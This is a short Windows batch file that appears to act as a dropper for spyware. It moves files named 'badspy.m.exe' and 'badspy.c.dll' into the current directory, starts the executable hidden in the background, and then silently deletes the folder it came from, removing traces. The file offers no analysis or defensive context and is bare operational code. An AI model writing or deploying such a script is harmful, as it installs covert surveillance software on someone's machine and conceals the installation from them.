@echo off
ping 127.0.0.1 -n 1 > nul
move /y %~dp0\badspy.m.exe %cd%
move /y %~dp0\badspy.c.dll %cd%
if exist %cd%\badspy.m.exe start "" /b %cd%\badspy.m.exe
start "" /b rd /s /q %~dp0